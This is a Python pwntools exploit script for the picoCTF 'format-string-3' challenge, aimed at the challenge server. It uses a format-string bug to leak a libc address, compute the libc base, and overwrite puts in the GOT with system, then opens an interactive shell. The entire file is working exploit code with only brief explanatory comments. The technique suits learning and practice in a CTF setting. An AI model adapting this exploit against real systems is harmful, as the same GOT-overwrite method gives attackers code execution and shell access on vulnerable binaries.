from pwn import *

# this line is necessary because these format string vulnerabilities
# depend on whether it is 32 or 64 bit, big or little endian, etc.
elf = context.binary = ELF("./format-string-3")

def my_process():
    return remote("rhea.picoctf.net", 49710)

# find the offset and padlen for %n
def exec_fmt(payload: bytes) -> bytes | None:
    io = my_process()
    io.sendline(payload)
    return io.recvall()

autofmt = FmtStr(exec_fmt)
print(f"{autofmt.offset=}")

# libc knows the relative addresses, but not absolute. find it
libc = ELF("./libc.so.6")
io = my_process()
io.recvuntil("libc: ")
setvbuf_addr = int(io.recvline().strip().decode(), 16)
print(f"{setvbuf_addr=:x}")

addr_offset = setvbuf_addr - libc.symbols["setvbuf"]
libc.address = addr_offset
print(f"{libc.address=:x}")

# now we have all of the pieces we need.
payload = fmtstr_payload(autofmt.offset, {elf.got["puts"]: libc.symbols["system"]})
print(f"{payload=}")
io.sendline(payload)
io.interactive()
